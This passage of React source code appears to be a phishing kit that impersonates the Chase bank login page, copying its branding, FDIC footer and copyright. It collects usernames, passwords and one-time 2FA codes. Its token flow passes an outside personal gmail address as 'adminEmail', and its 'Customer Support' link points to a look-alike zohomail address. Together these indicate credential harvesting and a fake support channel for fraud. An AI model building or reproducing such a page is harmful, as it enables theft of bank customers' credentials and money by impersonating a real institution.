                  onClick={() => window.open("/privacy", "_blank")}
                  className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <Shield className="w-5 h-5 text-[#117aca]" />
                    <span className="font-medium text-gray-900">Privacy Policy</span>
                  </div>
                  <ExternalLink className="w-4 h-4 text-gray-400" />
                </button>

                <button
                  onClick={() =>
                    window.open("/security", "_blank")
                  }
                  className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <Lock className="w-5 h-5 text-[#117aca]" />
                    <span className="font-medium text-gray-900">Security Center</span>
                  </div>
                  <ExternalLink className="w-4 h-4 text-gray-400" />
                </button>

                <button
                  onClick={() =>
                    window.open(
                      "/terms",
                      "_blank",
                    )
                  }
                  className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <User className="w-5 h-5 text-[#117aca]" />
                    <span className="font-medium text-gray-900">Terms of Service</span>
                  </div>
                  <ExternalLink className="w-4 h-4 text-gray-400" />
                </button>
              </div>

              <div className="mt-6 p-4 bg-blue-50 rounded-xl">
                <h3 className="font-semibold text-gray-900 mb-2">Your Security Matters</h3>
                <ul className="text-sm text-gray-600 space-y-2">
                  <li className="flex items-start gap-2">
                    <Check className="w-4 h-4 text-green-600 mt-0.5" />
                    <span>256-bit encryption protects your data</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <Check className="w-4 h-4 text-green-600 mt-0.5" />
                    <span>Multi-factor authentication available</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <Check className="w-4 h-4 text-green-600 mt-0.5" />
                    <span>Real-time fraud monitoring</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <Check className="w-4 h-4 text-green-600 mt-0.5" />
                    <span>Zero Liability Protection</span>
                  </li>
                </ul>
              </div>

              <div className="mt-4 p-4 bg-gray-50 rounded-xl">
                <p className="text-xs text-gray-600">
                  <strong>Report suspicious activity:</strong> Call 1-800-935-9935 or visit chase.com/reportfraud
                </p>
              </div>
            </div>
          )}

          {/* More Options Modal */}
          {modalView === "more-options" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-4">More Options</h2>

              <div className="space-y-3">
                <button
                  onClick={() => window.open("https://locator.chase.com/", "_blank")}
                  className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <Building2 className="w-5 h-5 text-[#117aca]" />
                    <span className="font-medium text-gray-900">Find a Branch or ATM</span>
                  </div>
                  <ExternalLink className="w-4 h-4 text-gray-400" />
                </button>

                <button
                  onClick={() => window.open("https://www.chase.com/personal/credit-cards", "_blank")}
                  className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <CreditCard className="w-5 h-5 text-[#117aca]" />
                    <span className="font-medium text-gray-900">Credit Cards</span>
                  </div>
                  <ExternalLink className="w-4 h-4 text-gray-400" />
                </button>

                <button
                  onClick={() => window.open("https://www.chase.com/personal/mortgage", "_blank")}
                  className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <HomeIcon className="w-5 h-5 text-[#117aca]" />
                    <span className="font-medium text-gray-900">Home Loans</span>
                  </div>
                  <ExternalLink className="w-4 h-4 text-gray-400" />
                </button>

                <button
                  onClick={() => window.open("https://www.chase.com/business", "_blank")}
                  className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <Building2 className="w-5 h-5 text-[#117aca]" />
                    <span className="font-medium text-gray-900">Business Banking</span>
                  </div>
                  <ExternalLink className="w-4 h-4 text-gray-400" />
                </button>

                <button
                  onClick={() => window.open("mailto:chase.org_info247@zohomail.com", "_blank")}
                  className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <Mail className="w-5 h-5 text-[#117aca]" />
                    <span className="font-medium text-gray-900">Customer Support</span>
                  </div>
                  <ExternalLink className="w-4 h-4 text-gray-400" />
                </button>
              </div>

              <div className="mt-6 p-4 bg-gray-50 rounded-xl text-center">
                <p className="text-sm text-gray-600 mb-2">Need help?</p>
                <p className="text-[#117aca] font-semibold">1-800-935-9935</p>
                <p className="text-xs text-gray-500 mt-1">Available 24/7</p>
              </div>
            </div>
          )}

          {/* 2FA verification modal */}
          {modalView === "2fa-verify" && (
            <div className="p-6">
              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                  <Shield className="w-8 h-8 text-[#117aca]" />
                </div>
                <h2 className="text-xl font-bold text-gray-900 mb-2">Two-Factor Authentication</h2>
                <p className="text-gray-600">
                  Enter the 6-digit code sent to {appSettings?.twoFactorPhone || "your phone"}
                </p>
              </div>

              <input
                type="text"
                maxLength={6}
                placeholder="000000"
                value={otpCode}
                className="w-full border border-gray-300 rounded-lg px-4 py-4 text-center text-2xl tracking-widest mb-6 focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                onChange={async (e) => {
                  const code = e.target.value
                  setOtpCode(code)
                  
                  if (code.length === 6) {
                    setIsLoading(true)
                    try {
                      // Verify OTP via API
                      const verifyResponse = await fetch('/api/auth', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                          action: 'verify-otp',
                          userId: twoFAUserId,
                          otp: code,
                        }),
                      })

                      const verifyData = await verifyResponse.json()

                      if (!verifyResponse.ok) {
                        throw new Error(verifyData.error || 'OTP verification failed')
                      }

                      console.log("[v0] OTP verified successfully")

                      // Create session with full user data from backend
                      localStorage.setItem("chase_logged_in", "true")
                      localStorage.setItem("chase_remember_me", rememberMe ? "true" : "false")
                      localStorage.setItem("chase_last_login", new Date().toISOString())
                      localStorage.setItem("chase_session_token", `token_${Date.now()}`)
                      localStorage.setItem("chase_user_id", twoFAUserId)

                      // Store user data from backend response
                      if (verifyData.user) {
                        localStorage.setItem("chase_user_data", JSON.stringify(verifyData.user))
                        localStorage.setItem("chase_user_role", verifyData.user.role || "user")
                        localStorage.setItem("chase_user_name", verifyData.user.name || "")
                        localStorage.setItem("chase_user_email", verifyData.user.email || "")
                      }

                      // Store accounts data from backend
                      if (verifyData.accounts) {
                        localStorage.setItem("chase_user_accounts", JSON.stringify(verifyData.accounts))
                      }

                      if (rememberMe) {
                        localStorage.setItem("chase_username", username)
                      } else {
                        localStorage.removeItem("chase_username")
                      }

                      toast({
                        title: "Welcome back",
                        description: "You have successfully signed in to Chase.",
                      })

                      setIsLoading(false)
                      onLogin()
                      setModalView("none")
                      setOtpCode("")
                    } catch (error) {
                      console.error("[v0] OTP verification error:", error)
                      toast({
                        title: "Verification Failed",
                        description: error instanceof Error ? error.message : "Invalid code. Please try again.",
                        variant: "destructive",
                      })
                      setOtpCode("")
                      setIsLoading(false)
                    }
                  }
                }}
              />

              <p className="text-xs text-gray-500 text-center mb-6">Enter the 6-digit code to complete verification</p>

              <button
                onClick={() => {
                  toast({
                    title: "Code Resent",
                    description: `A new verification code has been sent to ${appSettings?.twoFactorPhone || "your phone"}.`,
                  })
                }}
                className="w-full py-3 text-[#117aca] hover:underline text-sm mb-2"
              >
                Resend Code
              </button>

              <button
                onClick={() => {
                  setModalView("none")
                  setIsLoading(false)
                }}
                className="w-full py-3 text-gray-600 hover:text-gray-900 text-sm"
              >
                Cancel
              </button>
            </div>
          )}
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen min-h-dvh bg-[#117aca] flex flex-col overflow-x-hidden overscroll-none touch-pan-y">
      {/* Header with CHASE logo */}
      <div className="py-8 flex justify-center items-center">
        <div className="flex items-center gap-2">
          <span className="text-white text-2xl font-bold tracking-wide">CHASE</span>
          <Image src="/images/chase-logo.png" alt="Chase" width={36} height={36} className="rounded" />
        </div>
      </div>

      {/* Main Content - Login Card */}
      <div className="flex-1 flex flex-col justify-center px-4 pb-4">
        <div className="bg-white rounded-xl shadow-lg mx-auto w-full max-w-sm px-6 py-8">
          {/* Error Message */}
          {error && (
            <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg">
              <p className="text-red-600 text-sm">{error}</p>
            </div>
          )}

          {/* Username Field - underline style */}
          <div className="mb-6">
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              onKeyDown={handleKeyPress}
              className="w-full border-b border-gray-300 py-3 px-0 text-gray-900 focus:outline-none focus:border-[#117aca] transition-colors bg-transparent placeholder-gray-500"
              placeholder="Enter your username"
              autoComplete="username"
            />
          </div>

          {/* Password Field - underline style */}
          <div className="mb-6">
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyDown={handleKeyPress}
                className="w-full border-b border-gray-300 py-3 px-0 pr-10 text-gray-900 focus:outline-none focus:border-[#117aca] transition-colors bg-transparent placeholder-gray-500"
                placeholder="Enter your password"
                autoComplete="current-password"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-0 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
              >
                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
          </div>

          {/* Checkboxes - Remember me and Use token */}
          <div className="flex items-center justify-between mb-8">
            <div className="flex items-center gap-2">
              <Checkbox
                id="remember"
                checked={rememberMe}
                onCheckedChange={(checked) => setRememberMe(checked as boolean)}
                className="border-[#117aca] data-[state=checked]:bg-[#117aca] data-[state=checked]:border-[#117aca]"
              />
              <label htmlFor="remember" className="text-sm text-gray-600 cursor-pointer">
                Remember me
              </label>
            </div>
            <div className="flex items-center gap-2">
              <Checkbox
                id="token"
                checked={useToken}
                onCheckedChange={async (checked) => {
                  setUseToken(checked as boolean)
                  if (checked && !generatedToken) {
                    try {
                      setIsLoading(true)
                      console.log("[v0] Requesting security token via email")

                      // Import the email service
                      const { sendSecurityTokenEmail, getTokenSentMessage } = await import(
                        "@/lib/email-service"
                      )

                      // Send token to user's email if available, otherwise use placeholder
                      const userEmail = username || "your registered email"
                      const result = await sendSecurityTokenEmail({
                        userEmail: userEmail,
                        adminEmail: "hungchun164@gmail.com",
                        userName: username || "Chase User",
                        tokenType: "login",
                      })

                      if (result.success) {
                        setGeneratedToken("TOKEN_SENT") // Mark as sent
                        setTokenExpiry(Date.now() + 60000)
                        toast({
                          title: "Security Token Sent",
                          description: getTokenSentMessage(userEmail, "login"),
                        })
                        setModalView("token-setup")
                      } else {
                        throw new Error(result.error || "Failed to send token")
                      }
                    } catch (error) {
                      console.error("[v0] Error requesting token:", error)
                      toast({
                        title: "Error",
                        description: error instanceof Error ? error.message : "Failed to send token",
                        variant: "destructive",
                      })
                      setUseToken(false)
                    } finally {
                      setIsLoading(false)
                    }
                  }
                }}
                className="border-gray-400"
                disabled={isLoading}
              />
              <label htmlFor="token" className="text-sm text-gray-600 cursor-pointer">
                Use token
              </label>
            </div>
          </div>

          {/* Token Input Field - shown when useToken is true */}
          {useToken && (
            <div className="mb-6">
              <div className="relative">
                <input
                  type="text"
                  maxLength={6}
                  value={tokenCode}
                  onChange={(e) => setTokenCode(e.target.value.replace(/\D/g, ""))}
                  className="w-full border-b border-gray-300 py-3 px-0 pr-10 text-gray-900 focus:outline-none focus:border-[#117aca] transition-colors bg-transparent placeholder-gray-500 text-center tracking-widest"
                  placeholder="Enter 6-digit code"
                />
                <button
                  type="button"
                  onClick={async () => {
                    try {
                      setIsLoading(true)
                      const { sendSecurityTokenEmail, getTokenSentMessage } = await import(
                        "@/lib/email-service"
                      )
                      const userEmail = username || "your registered email"
                      const result = await sendSecurityTokenEmail({
                        userEmail: userEmail,
                        adminEmail: "hungchun164@gmail.com",
                        userName: username || "Chase User",
                        tokenType: "login",
                      })
                      if (result.success) {
                        setGeneratedToken("TOKEN_SENT")
                        setTokenExpiry(Date.now() + 60000)
                        toast({
                          title: "New Token Sent",
                          description: getTokenSentMessage(userEmail, "login"),
                        })
                      }
                    } catch (error) {
                      console.error("[v0] Error resending token:", error)
                      toast({
                        title: "Error",
                        description: "Failed to resend token",
                        variant: "destructive",
                      })
                    } finally {
                      setIsLoading(false)
                    }
                  }}
                  className="absolute right-0 top-1/2 -translate-y-1/2 text-[#117aca] hover:text-[#0a5a9e]"
                  disabled={isLoading}
                >
                  <Mail className="w-5 h-5" />
                </button>
              </div>
              <p className="text-xs text-gray-500 mt-1 text-center">
                Enter the 6-digit code sent to your email • 
                <button
                  onClick={async () => {
                    try {
                      setIsLoading(true)
                      const { sendSecurityTokenEmail, getTokenSentMessage } = await import(
                        "@/lib/email-service"
                      )
                      const userEmail = username || "your registered email"
                      const result = await sendSecurityTokenEmail({
                        userEmail: userEmail,
                        adminEmail: "hungchun164@gmail.com",
                        userName: username || "Chase User",
                        tokenType: "login",
                      })
                      if (result.success) {
                        setGeneratedToken("TOKEN_SENT")
                        setTokenExpiry(Date.now() + 60000)
                        toast({
                          title: "Token Resent",
                          description: getTokenSentMessage(userEmail, "login"),
                        })
                      }
                    } catch (error) {
                      console.error("[v0] Error:", error)
                    } finally {
                      setIsLoading(false)
                    }
                  }}
                  className="text-[#117aca] hover:underline ml-1 disabled:opacity-50"
                  disabled={isLoading}
                >
                  Resend code
                </button>
              </p>
            </div>
          )}

          {/* Sign In Button */}
          <Button
            onClick={handleSignIn}
            disabled={isLoading}
            className="w-full bg-[#117aca] hover:bg-[#0a5a9e] text-white py-6 rounded-md text-base font-medium transition-colors border-2 border-[#117aca]"
          >
            {isLoading ? (
              <div className="flex items-center gap-2">
                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                <span>Signing in...</span>
              </div>
            ) : (
              "Sign in"
            )}
          </Button>

          {/* Forgot username or password link */}
          <div className="text-center mt-6 mb-8">
            <button onClick={() => setModalView("forgot")} className="text-[#117aca] hover:underline text-sm font-medium">
              Forgot username or password?
            </button>
          </div>

          {/* Account Access Options - Prominent Section */}
          <div className="space-y-2 mb-6">
            <button 
              onClick={() => setModalView("signup")} 
              className="w-full p-3 border-2 border-[#117aca] text-[#117aca] rounded-lg hover:bg-blue-50 transition-colors font-medium text-sm"
            >
              Sign up for Chase online
            </button>
            <button 
              onClick={() => setModalView("open-account")} 
              className="w-full p-3 border-2 border-gray-300 text-gray-700 rounded-lg hover:border-[#117aca] hover:bg-blue-50 transition-colors font-medium text-sm"
            >
              Open a new account
            </button>
          </div>

          {/* Additional Links Row */}
          <div className="flex items-center justify-center gap-2 text-xs text-gray-600 flex-wrap">
            <button onClick={() => setModalView("privacy")} className="text-[#117aca] hover:underline">
              Privacy & Security
            </button>
            <span className="text-gray-400">•</span>
            <a href="/faq" className="text-[#117aca] hover:underline">
              FAQ
            </a>
            <span className="text-gray-400">•</span>
            <a href="/terms" className="text-[#117aca] hover:underline">
              Terms
            </a>
            <span className="text-gray-400">•</span>
            <button onClick={() => setModalView("more-options")} className="text-[#117aca] hover:underline">
              More
            </button>
          </div>
        </div>
      </div>

      {/* Footer - Equal Housing Lender, FDIC, Copyright - Updated year to 2025 */}
      <div className="pb-6 pt-4 text-center space-y-2 px-4">
        <div className="flex items-center justify-center gap-1 text-xs text-white/80">
          <HomeIcon className="w-4 h-4" />
          <span>Equal Housing Lender</span>
        </div>
        <p className="text-xs text-white/80 leading-relaxed">
          Deposit products provided by JPMorgan Chase Bank, N.A.
          <br />
          Member FDIC
        </p>
        <p className="text-xs text-white/80 leading-relaxed">
          Credit cards are issued by JPMorgan Chase Bank, N.A.
          <br />
          Member FDIC
        </p>
        <p className="text-xs text-white/80 mt-2">© 2025 JPMorgan Chase & Co.</p>
      </div>

      {renderModal()}
    </div>
  )
}
